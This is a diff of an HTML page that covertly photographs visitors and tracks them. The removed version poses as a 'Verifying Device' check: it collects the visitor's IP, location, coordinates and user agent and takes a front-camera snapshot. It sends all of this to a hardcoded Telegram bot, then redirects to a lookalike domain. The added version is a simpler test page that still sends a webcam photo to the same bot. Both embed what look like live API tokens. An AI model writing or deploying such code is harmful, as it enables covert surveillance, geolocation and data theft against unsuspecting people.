@@ -1,52 +1,23 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <meta charset="UTF-8">
-  <title>Verifying...</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    body { font-family: sans-serif; text-align: center; padding: 40px; }
-    video, canvas { display: none; }
-  </style>
-</head>
 <body>
-  <h2>Verifying Device...</h2>
-  <p>Please allow camera access.</p>
-
+  <h2>Testing Camera & Telegram</h2>
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas"></canvas>
 
   <script>
     const botToken = "8064189934:AAEv0eT2TdKAteC6vdyZkXL3cP7dbYSIfbQ";
     const chatId = "7216371031";
-    const redirectUrl = "https://opaslabs.vercal.app/";
 
-    let deviceInfo = "";
+    // Send TEST TEXT
+    fetch("https://api.telegram.org/bot" + botToken + "/sendMessage", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: chatId, text: "👋 Script started..." })
+    });
 
-    // STEP 1: GET IP + DEVICE INFO
-    fetch("https://ipinfo.io/json?token=18d2a866939a58")
-      .then(res => res.json())
-      .then(data => {
-        deviceInfo = 
-🔐 Visitor Info:
-🌐 IP: ${data.ip}
-📍 ${data.city}, ${data.region}, ${data.country}
-📌 Coords: ${data.loc}
-📡 ISP: ${data.org}
-🧠 User-Agent: ${navigator.userAgent}
-🕓 Time: ${new Date().toLocaleString()}
-        .trim();
-
-        // Send text info first
-        fetch(https://api.telegram.org/bot${botToken}/sendMessage, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id: chatId, text: deviceInfo })
-        });
-      });
-
-    // STEP 2: CAMERA ACCESS & PHOTO
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+    // Start camera
+    navigator.mediaDevices.getUserMedia({ video: true })
       .then(stream => {
         const video = document.getElementById("video");
         const canvas = document.getElementById("canvas");
@@ -54,39 +25,28 @@
 
         video.srcObject = stream;
 
-        video.onloadedmetadata = () => {
+        setTimeout(() => {
           canvas.width = video.videoWidth;
           canvas.height = video.videoHeight;
+          ctx.drawImage(video, 0, 0);
 
-          // Take snapshot after 3 seconds
-          setTimeout(() => {
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            stream.getTracks().forEach(track => track.stop());
+          stream.getTracks().forEach(track => track.stop());
 
-            canvas.toBlob(blob => {
-              const formData = new FormData();
-              formData.append("chat_id", chatId);
-              formData.append("photo", blob);
-              formData.append("caption", "📸 Visitor Snapshot");
+          canvas.toBlob(blob => {
+            const formData = new FormData();
+            formData.append("chat_id", chatId);
+            formData.append("photo", blob);
+            formData.append("caption", "✅ Snapshot sent");
 
-              fetch(https://api.telegram.org/bot${botToken}/sendPhoto, {
-                method: "POST",
-                body: formData
-              });
-
-              // Redirect after photo sent
-              setTimeout(() => {
-                window.location.href = redirectUrl;
-              }, 2000);
-            }, "image/jpeg", 0.9);
-          }, 3000);
-        };
+            fetch("https://api.telegram.org/bot" + botToken + "/sendPhoto", {
+              method: "POST",
+              body: formData
+            }).then(() => alert("✅ Sent to Telegram!"));
+          }, "image/jpeg", 0.9);
+        }, 3000);
       })
       .catch(err => {
-        alert("❌ Camera access denied: " + err.message);
-        setTimeout(() => {
-          window.location.href = redirectUrl;
-        }, 3000);
+        alert("❌ Camera access failed: " + err.message);
       });
   </script>
 </body>
